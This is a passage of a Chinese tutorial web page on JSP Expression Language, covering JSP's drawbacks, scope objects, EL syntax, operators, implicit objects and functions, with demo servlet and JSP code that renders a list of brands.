+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;&lt;%=</span>brand.<span style=color:#a6e22e>getOrdered</span>()<span style=color:#f92672>%&gt;&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;&lt;%=</span>brand.<span style=color:#a6e22e>getDescription</span>()<span style=color:#f92672>%&gt;&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;&lt;%=</span>brand.<span style=color:#a6e22e>getStatus</span>() <span style=color:#f92672>==</span> 1 <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;启用&#34;</span>:<span style=color:#e6db74>&#34;禁用&#34;</span><span style=color:#f92672>%&gt;&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;</span>td<span style=color:#f92672>&gt;&lt;</span>a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span><span style=color:#f92672>&gt;</span>修改<span style=color:#f92672>&lt;/</span>a<span style=color:#f92672>&gt;</span> <span style=color:#f92672>&lt;</span>a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span><span style=color:#f92672>&gt;</span>删除<span style=color:#f92672>&lt;/</span>a<span style=color:#f92672>&gt;&lt;/</span>td<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/</span>tr<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;%</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  <span style=color:#f92672>%&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span>table<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span>body<span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span>html<span style=color:#f92672>&gt;</span>
+</span></span></code></pre></div><h3 id=jsp-缺点>JSP 缺点
+<a class=anchor href=#jsp-%e7%bc%ba%e7%82%b9>#</a></h3><p>通过上面的案例，可以发现 JSP 的很多缺点。</p><p>由于 JSP 页面中既可以定义 HTML 标签，又可以定义 Java 代码，造成了一下问题：</p><ol><li>难写难读难维护</li><li>书写麻烦，尤其是复杂的页面</li><li>既要写 HTML 标签，还要写 Java 代码</li><li>复杂度高，运行时需要依赖各种环境，JRE、JSP 容器、JavaEE等</li><li>占内存和磁盘，JSP 会自动生成<code>.java</code>和<code>.class</code>文件占磁盘，运行的是<code>.class</code>文件占内存</li><li>调试困难，出错后需要找到自动生成的<code>.java</code>文件进行调试</li><li>不利于团队协作，前端人员不会 Java，后端人员不精 HTML</li><li>如果页面布局发生变化，前端工程师对静态页面进行修改，然后再交给后端工程师，由后端工程师再将该页面改为 JSP 页面</li></ol><p>由于这些问题，JSP 已经逐渐退出历史舞台，以后开发更多的是使用 HTML + Ajax 来进行替代。Ajax 是异步的 JavaScript，有了这个技术之后，前端工程师只负责前端的开发，后端工程师只负责后端代码的开发。</p><p><img src=https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/tech.png alt=1></p><p>但是依然有时候不得不使用 JSP 进行开发，这时候就要介绍 EL 表达式了。</p><h2 id=el-表达式基础语法>EL 表达式基础语法
+<a class=anchor href=#el-%e8%a1%a8%e8%be%be%e5%bc%8f%e5%9f%ba%e7%a1%80%e8%af%ad%e6%b3%95>#</a></h2><p>EL 全称 <strong>Expression Language</strong>，即表达式语言。作用：</p><ol><li>用于简化 JSP 页面内的 Java 代码</li><li>主要作用是<strong>获取数据</strong>，其实就是从域对象中获取数据，然后将数据展示在页面上。</li></ol><p><strong>域对象就是“存放数据的地方”，而且有“作用范围（作用域）”。</strong> 数据存进去后，在它对应的范围内，任何地方都能取出来用。</p><p>Servlet 和 JSP 之间就是靠域对象传递数据的——Servlet 把数据放进去，JSP 从里面取出来展示。</p><p>JSP/Servlet 里有 4 个域对象，作用范围从小到大：</p><table><thead><tr><th style=text-align:left>域对象</th><th style=text-align:left>类型</th><th style=text-align:left>作用范围</th><th style=text-align:left>生命周期</th></tr></thead><tbody><tr><td style=text-align:left>pageContext</td><td style=text-align:left>PageContext</td><td style=text-align:left>当前页面</td><td style=text-align:left>当前 JSP 页面执行期间</td></tr><tr><td style=text-align:left>request</td><td style=text-align:left>HttpServletRequest</td><td style=text-align:left>一次请求</td><td style=text-align:left>请求开始到响应结束</td></tr><tr><td style=text-align:left>session</td><td style=text-align:left>HttpSession</td><td style=text-align:left>一次会话</td><td style=text-align:left>浏览器打开到关闭（或超时）</td></tr><tr><td style=text-align:left>application</td><td style=text-align:left>ServletContext</td><td style=text-align:left>整个应用</td><td style=text-align:left>服务器启动到关闭</td></tr></tbody></table><p>用法：</p><p>要先通过 page 标签设置不忽略 EL 表达式：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; isELIgnored=&#34;false&#34; %&gt;
+</code></pre><p>语法：</p><p><code>${expression}</code></p><p>在 JSP 中我们这可以这么写：</p><p><code>${brans}</code>，这是一个很神奇的机制。<code>${brans}</code>是获取域中存储的<code>key</code>作为<code>brands</code>的数据。JSP 中就有我们上面写的那四大域。</p><p>EL 表达式会依次从这四个域中寻找，直到找到为止，这四个域对象的作用范围：</p><p><img src=https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Range.png alt=1></p><p>例如：<code>${brands}</code>，EL 表达式获取数据，会先从<code>page</code>域对象中获取数据，如果没找到就会去<code>request</code>域对象中获取数据，如果再没有找到就去<code>session</code>域对象中获取，如果还没有才会去<code>application</code>中获取数据，感觉和双亲委派机制有点像啊。</p><h3 id=el-表达式-demo>EL 表达式 Demo
+<a class=anchor href=#el-%e8%a1%a8%e8%be%be%e5%bc%8f-demo>#</a></h3><p>使用 EL 表达式来获取数据，需要按照顺序完成几个步骤：</p><ul><li>获取数据，比如从数据库中拿到数据</li><li>将数据存储到<code>request</code>域中</li><li>转发到对应的 jsp 文件。通过转发，我们才能使用<code>request</code>域对象进行数据共享</li></ul><p>先定义一个 Servlet：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> org.example.jspdemo;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.ServletException;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.annotation.WebServlet;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServlet;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletRequest;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletResponse;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.ArrayList;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.List;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@WebServlet</span>(<span style=color:#e6db74>&#34;/demo1&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>BrandServlet</span> <span style=color:#66d9ef>extends</span> HttpServlet {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>doGet</span>(HttpServletRequest request, HttpServletResponse response) <span style=color:#66d9ef>throws</span> ServletException, IOException {
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//1. 准备数据</span>
+</span></span><span style=display:flex><span>        List<span style=color:#f92672>&lt;</span>Brand<span style=color:#f92672>&gt;</span> brands <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList<span style=color:#f92672>&lt;</span>Brand<span style=color:#f92672>&gt;</span>();
+</span></span><span style=display:flex><span>        brands.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> Brand(1,<span style=color:#e6db74>&#34;三只松鼠&#34;</span>,<span style=color:#e6db74>&#34;三只松鼠&#34;</span>,100,<span style=color:#e6db74>&#34;三只松鼠，好吃不上火&#34;</span>,1));
+</span></span><span style=display:flex><span>        brands.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> Brand(2,<span style=color:#e6db74>&#34;优衣库&#34;</span>,<span style=color:#e6db74>&#34;优衣库&#34;</span>,200,<span style=color:#e6db74>&#34;优衣库，服适人生&#34;</span>,0));
+</span></span><span style=display:flex><span>        brands.<span style=color:#a6e22e>add</span>(<span style=color:#66d9ef>new</span> Brand(3,<span style=color:#e6db74>&#34;小米&#34;</span>,<span style=color:#e6db74>&#34;小米科技有限公司&#34;</span>,1000,<span style=color:#e6db74>&#34;为发烧而生&#34;</span>,1));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//2. 存储到request域中</span>
+</span></span><span style=display:flex><span>        request.<span style=color:#a6e22e>setAttribute</span>(<span style=color:#e6db74>&#34;brands&#34;</span>,brands);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//3. 转发到 el-demo.jsp</span>
+</span></span><span style=display:flex><span>        request.<span style=color:#a6e22e>getRequestDispatcher</span>(<span style=color:#e6db74>&#34;/el-demo.jsp&#34;</span>).<span style=color:#a6e22e>forward</span>(request,response);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>doPost</span>(HttpServletRequest request, HttpServletResponse response) <span style=color:#66d9ef>throws</span> ServletException, IOException {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>doGet</span>(request, response);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ page import=&#34;org.example.jspdemo.Brand&#34; %&gt;
+&lt;%@ page import=&#34;java.util.List&#34; %&gt;
+&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&#34;en&#34;&gt;
+&lt;head&gt;
+    &lt;meta charset=&#34;UTF-8&#34;&gt;
+    &lt;title&gt;品牌列表&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;input type=&#34;button&#34; value=&#34;新增&#34;&gt;&lt;br&gt;
+&lt;hr&gt;
+&lt;table border=&#34;1&#34; cellspacing=&#34;0&#34; width=&#34;800&#34;&gt;
+    &lt;tr&gt;
+        &lt;th&gt;序号&lt;/th&gt;
+        &lt;th&gt;品牌名称&lt;/th&gt;
+        &lt;th&gt;企业名称&lt;/th&gt;
+        &lt;th&gt;排序&lt;/th&gt;
+        &lt;th&gt;品牌介绍&lt;/th&gt;
+        &lt;th&gt;状态&lt;/th&gt;
+        &lt;th&gt;操作&lt;/th&gt;
+    &lt;/tr&gt;
+
+    &lt;%
+        // 从 request 域取出 Servlet 转发过来的数据
+        List&lt;Brand&gt; brands = (List&lt;Brand&gt;) request.getAttribute(&#34;brands&#34;);
+        for (int i = 0; i &lt; brands.size(); i++) {
+            Brand brand = brands.get(i);
+            request.setAttribute(&#34;brand&#34;, brand);   // 关键：放进域，EL 才能取到
+    %&gt;
+    &lt;tr align=&#34;center&#34;&gt;
+        &lt;td&gt;${brand.id}&lt;/td&gt;
+        &lt;td&gt;${brand.brandName}&lt;/td&gt;
+        &lt;td&gt;${brand.companyName}&lt;/td&gt;
+        &lt;td&gt;${brand.ordered}&lt;/td&gt;
+        &lt;td&gt;${brand.description}&lt;/td&gt;
+        &lt;td&gt;${brand.status == 1 ? &#34;启用&#34; : &#34;禁用&#34;}&lt;/td&gt;
+        &lt;td&gt;&lt;a href=&#34;#&#34;&gt;修改&lt;/a&gt; &lt;a href=&#34;#&#34;&gt;删除&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;%
+        }
+    %&gt;
+&lt;/table&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>这里 demo 只是 EL 表达式的一小部分，<code>${expression}</code>是 EL 表达式的变量。</p><h3 id=运算符>运算符
+<a class=anchor href=#%e8%bf%90%e7%ae%97%e7%ac%a6>#</a></h3><h4 id=存取数据的运算符>存取数据的运算符
+<a class=anchor href=#%e5%ad%98%e5%8f%96%e6%95%b0%e6%8d%ae%e7%9a%84%e8%bf%90%e7%ae%97%e7%ac%a6>#</a></h4><p>EL 表达式提供<code>.</code>和<code>[]</code>两种运算符来存取数据。</p><p>当要存取的属性名称中包含一些特殊字符，比如<code>.</code>和<code>-</code>等并非字母或数字的符合，就一定要用<code>[]</code>，例如：<code>${user.My-Name}</code> 应当改为 <code>${user["My-Name"]}</code>。</p><p>如果要动态取值，就可以用<code>[]</code>来做，而<code>.</code>无法做到动态取值，例如：<code>${sessionScope.user[data]}</code>中 data 是一个变量。</p><h4 id=empty-运算符>empty 运算符
+<a class=anchor href=#empty-%e8%bf%90%e7%ae%97%e7%ac%a6>#</a></h4><p><code>empty</code>用来判断 EL 表达式中的对象或者变量是否为空。如果为空或者<code>null</code>。返回 true，否则返回 false。</p><h4 id=条件表达式>条件表达式
+<a class=anchor href=#%e6%9d%a1%e4%bb%b6%e8%a1%a8%e8%be%be%e5%bc%8f>#</a></h4><p>EL 表达式中，条件运算符的语法和 Java 的完全一致：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>${条件表达式<span style=color:#f92672>?</span>表达式1:表达式2}
+</span></span></code></pre></div><p>写一个简单的 demo：</p><p>operator.jsp：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ page import=&#34;com.solowalker.pojo.Site&#34; %&gt;
+&lt;%@ page import=&#34;java.util.ArrayList&#34; %&gt;
+&lt;%@ page import=&#34;java.util.List&#34; %&gt;
+&lt;%@ page import=&#34;java.util.HashMap&#34; %&gt;
+&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;JSP 运算符&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h3&gt;.运算符&lt;/h3&gt;
+
+&lt;%
+    Site site = new Site();
+    site.setName(&#34;Solowalker&#39;s blog&#34;);
+    site.setUrl(&#34;s0lowaker.github.io&#34;);
+    session.setAttribute(&#34;site&#34;, site);
+%&gt;
+欢迎来到${site.name}，博客网址是：${site.url}
+
+&lt;h3&gt;[]运算符&lt;/h3&gt;
+&lt;%
+    List tutorials = new ArrayList();
+    tutorials.add(&#34;Java&#34;);
+    tutorials.add(&#34;Python&#34;);
+    session.setAttribute(&#34;tutorials&#34;, tutorials);
+    HashMap siteMap = new HashMap();
+    siteMap.put(&#34;one&#34;, &#34;solo&#34;);
+    siteMap.put(&#34;two&#34;, &#34;walker&#34;);
+    session.setAttribute(&#34;site&#34;, siteMap);
+%&gt;
+tutorials 中的内容：${tutorials[0]}，${tutorials[1]}
+&lt;br&gt; siteMap 中的内容：${site.one}，${site.two}
+
+&lt;h3&gt;empty和条件运算符&lt;/h3&gt;
+&lt;!-- 当 cart 变量为空时，输出购物车为空，否则输出cart --&gt;
+&lt;%
+    String cart = null;
+%&gt;
+${empty cart?&#34;购物车为空&#34;:cart}
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>Site.java：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.solowalker.pojo;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Site</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> String name;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> String url;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>Site</span>() {
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>toString</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Site{&#34;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;name=&#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;\&#39;&#39;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;, URL=&#39;&#34;</span> <span style=color:#f92672>+</span> url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;\&#39;&#39;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;}&#39;</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getName</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> name;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setName</span>(String name) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> name;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getUrl</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> url;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setUrl</span>(String URL) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>url</span> <span style=color:#f92672>=</span> URL;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h4 id=变量>变量
+<a class=anchor href=#%e5%8f%98%e9%87%8f>#</a></h4><p>EL 表达式存取变量数据的方法很简单，比如<code>${username}</code>，意思是取出某一范围中名称为<code>username</code>的变量。因为我们并没有指定哪一个范围的<code>username</code>，所以它会依照顺序从 Page、Request、Session、Application 范围查找。加入途中找到<code>username</code>，就直接回传，不再继续找下去，但是如果全部范围内都没找到，就回传<code>""</code>。</p><p>EL 表达式的属性如下：</p><table><thead><tr><th>四大域</th><th>域在EL中的名称</th></tr></thead><tbody><tr><td>Page</td><td>PageScope</td></tr><tr><td>Request</td><td>RequestScope</td></tr><tr><td>Session</td><td>SessionScope</td></tr><tr><td>Application</td><td>ApplicationScope</td></tr></tbody></table><p>JSP 表达式语言定义可在表达式中使用的一下文字：</p><table><thead><tr><th>文字</th><th>文字的值</th></tr></thead><tbody><tr><td>Boolean</td><td>true 和 false</td></tr><tr><td>Integer</td><td>与 Java 类似。可以包含任何整数，例如 24、-45、567</td></tr><tr><td>Floating Point</td><td>与 Java 类似。可以包含任何正的或负的浮点数，例如 -1.8E-45、4.567</td></tr><tr><td>String</td><td>任何由单引号或双引号限定的字符串。对于单引号、双引号和反斜杠，使用反斜杠字符作为转义序列。必须注意，如果在字符串两端使用双引号，则单引号不需要转义。</td></tr><tr><td>Null</td><td>null</td></tr></tbody></table><h4 id=操作符>操作符
+<a class=anchor href=#%e6%93%8d%e4%bd%9c%e7%ac%a6>#</a></h4><p>JSP 表达式语言提供以下操作符，其中大部分是 Java 中常用的操作符：</p><table><thead><tr><th>术语</th><th>定义</th></tr></thead><tbody><tr><td>算术型</td><td>+、-（二元）、*、/、div、%、mod、-（一元）</td></tr><tr><td>逻辑型</td><td>and、&&、or、双管道符、!、not</td></tr><tr><td>关系型</td><td>==、eq、!=、ne、&lt;、lt、>、gt、&lt;=、le、>=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。</td></tr><tr><td>空</td><td>empty 空操作符是前缀操作，可用于确定值是否为空。</td></tr><tr><td>条件型</td><td>A ?B :C。根据 A 赋值的结果来赋值 B 或 C。</td></tr></tbody></table><h4 id=隐式对象>隐式对象
+<a class=anchor href=#%e9%9a%90%e5%bc%8f%e5%af%b9%e8%b1%a1>#</a></h4><p>JSP 表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：</p><table><thead><tr><th>术语</th><th>定义</th></tr></thead><tbody><tr><td>pageContext</td><td>JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，<code>${pageContext.response}</code>为页面的响应对象赋值。</td></tr></tbody></table><p>此外，还提供几个隐式对象，允许对以下对象进行简易访问：</p><table><thead><tr><th>术语</th><th>定义</th></tr></thead><tbody><tr><td>param</td><td>将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式<code>${param.name}</code>相当于 request.getParameter (name)。</td></tr><tr><td>paramValues</td><td>将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 <code>${paramvalues. name}</code> 相当于 request.getParamterValues(name)。</td></tr><tr><td>header</td><td>将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 <code>${header. name}</code> 相当于 request.getHeader(name)。</td></tr><tr><td>headerValues</td><td>将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式<code>${headerValues. name}</code>相当于 request.getHeaderValues(name)。</td></tr><tr><td>cookie</td><td>将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式<code>${cookie.name.value}</code>返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用<code>${headerValues.name}</code>表达式。</td></tr><tr><td>initParam</td><td>将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。</td></tr></tbody></table><p>除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面：</p><table><thead><tr><th>术语</th><th>定义</th></tr></thead><tbody><tr><td>pageScope</td><td>将页面范围的变量名称映射到其值。例如，EL 表达式可以使用<code>${pageScope.objectName}</code>访问一个 JSP 中页面范围的对象，还可以使用<code>${pageScope.objectName.attributeName}</code>访问对象的属性。</td></tr><tr><td>requestScope</td><td>将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用<code>${requestScope. objectName}</code>访问一个 JSP 请求范围的对象，还可以使用<code>${requestScope.objectName.attributeName}</code>访问对象的属性。</td></tr><tr><td>sessionScope</td><td>将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：<code>${sessionScope.name}</code></td></tr><tr><td>applicationScope</td><td>将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。</td></tr></tbody></table><h5 id=pagecontext-对象>pageContext 对象
+<a class=anchor href=#pagecontext-%e5%af%b9%e8%b1%a1>#</a></h5><p><code>pageContext</code>对象是 JSP 中<code>pageContext</code>对象的引用。通过<code>pageContext</code>对象，我们可以访问<code>request</code>对象，比如访问<code>request</code>对象传入的查询字符串：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>${pageContext.<span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>queryString</span>}
+</span></span></code></pre></div><h5 id=scope-对象>Scope 对象
+<a class=anchor href=#scope-%e5%af%b9%e8%b1%a1>#</a></h5><p>pageScope，requestScope，sessionScope，applicationScope 变量用来访问存储在各个作用域层次的变量。</p><p>如果我们想要显式访问在 applicationScope 层的 box 变量，可以这样来访问：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>applicationScope.<span style=color:#a6e22e>box</span>
+</span></span></code></pre></div><p>object.jsp：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;JSP 对象&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h3&gt;pageContext 对象&lt;/h3&gt;
+
+${pageContext.request.queryString}
+
+&lt;br/&gt;
+
+&lt;h3&gt;Scope 对象&lt;/h3&gt;
+
+&lt;%
+  pageContext.setAttribute(&#34;name&#34;,&#34;solo_page&#34;);
+  request.setAttribute(&#34;name&#34;,&#34;solo_page&#34;);
+  session.setAttribute(&#34;user&#34;,&#34;solo_session&#34;);
+  application.setAttribute(&#34;user&#34;,&#34;solo_application&#34;);
+%&gt;
+
+pageScope.name:${pageScope.name}
+&lt;/br&gt;
+requestScope.name : ${requestScope.name}
+&lt;/br&gt;
+sessionScope.user : ${sessionScope.user}
+&lt;/br&gt;
+applicationScope.user : ${applicationScope.user}
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h5 id=param-和-paramvalues-对象>param 和 paramValues 对象
+<a class=anchor href=#param-%e5%92%8c-paramvalues-%e5%af%b9%e8%b1%a1>#</a></h5><p><code>param</code>和<code>paramValues</code>对象用来访问参数值，通过使用<code>request.getParameter</code>和<code>request.getParameterValues</code>方法。</p><p>比如我们访问一个名为<code>order</code>的参数，可以这么写：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>${param.<span style=color:#a6e22e>order</span>}<span style=color:#960050;background-color:#1e0010>，</span>或者${param<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;order&#34;</span><span style=color:#f92672>]</span>}<span style=color:#960050;background-color:#1e0010>。</span>
+</span></span></code></pre></div><p>下面的例子表明了如何访问<code>request</code>中的<code>username</code>参数：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ page import=&#34;java.io.*,java.util.*&#34; %&gt;
+&lt;%
+    String title = &#34;Accessing Request Param&#34;;
+%&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;
+&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;
+&lt;/center&gt;
+&lt;div align=&#34;center&#34;&gt;
+&lt;p&gt;${param[&#34;username&#34;]}&lt;/p&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p><code>param</code>对象返回单一的字符串，而<code>paramValues</code>对象则返回一个字符串数组。</p><h5 id=header-和-headervalues-对象>header 和 headerValues 对象
+<a class=anchor href=#header-%e5%92%8c-headervalues-%e5%af%b9%e8%b1%a1>#</a></h5><p><code>header</code>和<code>headerValues</code>对象用来访问信息头，通过使用<code>request.getHeader()</code>方法和<code>request.getHeaders()</code>方法。比如，我们要访问 UA 头，可以这么写：<code>${header.user-agent}</code>，也可以<code>${header["user-agent"]}</code>。</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;p&gt;${header[&#34;user-agent&#34;]}&lt;/p&gt;
+</code></pre><h4 id=el-中的函数>EL 中的函数
+<a class=anchor href=#el-%e4%b8%ad%e7%9a%84%e5%87%bd%e6%95%b0>#</a></h4><p>EL 允许我们在表达式中使用函数，这些函数必须被定义在自定义标签库中。函数的使用语法：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>${ns:func(param1, param2, ...)}
+</code></pre><p><code>ns</code>指命名空间，<code>func</code>指函数的名称，然后就是参数列表。比如：有函数<code>fn:length</code>，在 JSTL 库中定义，可以像下面这样来获取一个字符串的长度：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>${fn:length(&#34;Get my length&#34;)}
